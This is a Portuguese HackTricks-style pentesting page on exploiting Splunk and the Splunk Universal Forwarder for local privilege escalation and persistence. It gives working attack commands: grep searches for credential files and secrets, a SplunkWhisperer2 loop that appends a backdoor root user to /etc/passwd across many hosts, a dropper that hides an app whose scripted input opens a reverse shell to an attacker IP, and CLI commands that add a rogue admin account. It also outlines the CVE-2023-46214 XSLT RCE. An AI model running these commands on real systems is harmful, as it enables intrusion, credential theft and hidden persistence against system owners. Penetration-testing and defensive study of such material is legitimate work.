# Splunk LPE e Persistence

{{#include ../../banners/hacktricks-training.md}}

Ao **enumerar** uma máquina **internamente** ou **externamente**, se você encontrar o **Splunk em execução** (geralmente **8000** para a interface web e **8089** para a API de gerenciamento), credenciais válidas podem frequentemente ser transformadas em **execução de código** por meio da instalação de apps, scripted inputs ou ações de gerenciamento. Se o Splunk estiver sendo executado como **root**, isso frequentemente se torna uma **escalada de privilégios** imediata.

Se você precisa apenas da superfície de ataque remota genérica, enumeração ou do caminho de RCE por upload de app, consulte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se você **já for root** e o serviço Splunk não estiver escutando apenas no localhost, você também poderá roubar **hashes de senha do Splunk**, recuperar **secrets criptografados** ou enviar um **app malicioso** para manter a persistência localmente ou em vários forwarders.

## Arquivos Locais Interessantes

Quando você obtiver acesso a um host executando o Splunk ou o Splunk Universal Forwarder, estes geralmente são os caminhos mais interessantes:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuários locais do Splunk e hashes de senha.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chave usada pelo Splunk para criptografar secrets armazenados em vários arquivos `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: arquivo de bootstrap do admin inicial; útil em gold images e erros de provisioning. Ele é ignorado se `etc/passwd` já existir.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: local onde scripted inputs costumam ser habilitados.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`**: bons locais para ocultar um app persistente ou revisar o que já está sendo distribuído.

## Resumo do Exploit do Splunk Universal Forwarder Agent

Para mais detalhes, consulte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este é apenas um resumo:

**Visão geral do exploit:**
Um exploit direcionado ao Splunk Universal Forwarder (UF) permite que atacantes com a **senha do agent** executem código arbitrário em sistemas que executam o agent, comprometendo potencialmente uma grande parte do ambiente.

**Por que funciona:**

- O serviço de gerenciamento do UF costuma estar exposto na **TCP 8089**.
- Atacantes podem se autenticar na API e instruir o forwarder a instalar um **malicious app bundle**.
- A mesma primitive pode ser usada localmente para **LPE** ou remotamente para **RCE**.
- Ferramentas públicas, como o **SplunkWhisperer2**, criam o app bundle automaticamente e podem adaptar payloads para targets Linux.

**Formas comuns de recuperar a senha:**

- Credenciais em texto claro em documentação, scripts, shares ou automação de deployment.
- Password hashes dentro de `$SPLUNK_HOME/etc/passwd`, seguidos de cracking offline.
- Golden images ou sobras de provisioning, como `user-seed.conf`.

**Impacto:**

- Execução de código com nível SYSTEM/root em cada host comprometido.
- Deployment de apps persistentes, backdoors ou ransomware.
- Desabilitar ou adulterar a telemetry antes que os dados sejam encaminhados.

**Exemplo de comando para exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizáveis:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs ou Malicious Apps

Se você tiver **acesso de escrita ao filesystem** como `root`/`splunk`, ou acesso autenticado para instalar apps, um mecanismo de persistence muito confiável é inserir um **custom app** com um **scripted input**. A própria documentação do Splunk espera que os scripted inputs estejam em um diretório de app e sejam habilitados a partir de `inputs.conf`.

Layout típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` mínimo:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper rápido para Linux:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- O mesmo truque funciona no **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Attackers geralmente se misturam modificando um add-on legítimo em vez de criar um app obviamente malicioso.
- Em um **deployment server**, instalar um app malicioso dentro de `deployment-apps/` se transforma em **persistência em toda a frota**, porque os forwarders consultam o servidor, baixam apps atualizados e geralmente reiniciam para aplicá-los.

## Roubo de credenciais e takeover de admin

Se você puder ler os arquivos locais do Splunk, normalmente há dois objetivos importantes: recuperar o **acesso de admin do Splunk** e recuperar **credenciais de serviço criptografadas**.

### Hashes de senha e usuários locais

O Splunk armazena os dados de autenticação local em `etc/passwd`. Dependendo do deployment, quebrar esse arquivo pode recuperar credenciais válidas para a interface web e a management API.

Se você já tiver credenciais válidas de **admin** e o Splunk usar o backend de autenticação **nativo**, a própria CLI poderá ser usada para persistência:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valores criptografados

O Splunk usa `etc/auth/splunk.secret` para proteger valores sensíveis armazenados em vários arquivos de configuração. Se você conseguir roubar tanto o **secret** quanto os arquivos **`.conf`** relevantes, muitas vezes poderá recuperar ou reutilizar:

- shared secrets de forwarder/indexer, como `pass4SymmKey`
- senhas de chaves privadas TLS, como `sslPassword`
- credenciais de bind LDAP, como `bindDNPassword`

Isso é útil para **movimentação lateral** mesmo quando a senha do administrador do Splunk não pode ser quebrada.

### Abuso de `user-seed.conf`

`user-seed.conf` só é consumido durante a primeira inicialização ou quando `etc/passwd` não existe. Isso o torna menos útil em uma máquina ativa, mas muito interessante em:

- templates de instalação comprometidos
- imagens de container
- workflows de provisionamento não interativos
- appliances em que o Splunk é reinicializado automaticamente

Nesses casos, inserir um `HASHED_PASSWORD` gerado com `splunk hash-passwd` oferece uma maneira discreta de recuperar o acesso de administrador após a reimplantação.

## Abusando de Queries do Splunk

Para mais detalhes, consulte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Uma técnica recente útil é abusar de **XSLT fornecido pelo usuário** em versões vulneráveis do Splunk Enterprise para transformar uma conta autenticada com poucos privilégios em **execução de comandos no SO** como o usuário `splunk`.

Fluxo geral:

1. Autentique-se no Splunk.
2. Faça upload de um arquivo **XSL** malicioso por meio da funcionalidade de preview/upload.
3. Faça o Splunk renderizar os resultados da pesquisa com essa stylesheet enviada a partir do diretório **dispatch**.
4. Use o payload XSLT para gravar um arquivo ou acionar a execução por meio do search pipeline do Splunk (por exemplo, alcançando funcionalidades internas como `runshellscript`).

O ponto ofensivo importante é que esse caminho oferece **RCE pós-autenticação sem precisar de app upload**. No Linux, normalmente isso resulta no acesso à conta **`splunk`**, que ainda é valiosa porque esse usuário frequentemente é proprietário da árvore da aplicação, pode ler secrets e pode inserir apps persistentes que sobrevivem à perda do shell.

Um caminho representativo usado durante a exploração é:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se o Splunk estiver sendo executado com privilégios excessivos, ou se o usuário `splunk` tiver acesso a scripts perigosos, unidades de serviço graváveis ou regras de `sudo` inadequadas, isso se torna uma cadeia de **LPE** direta.

## Referências

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
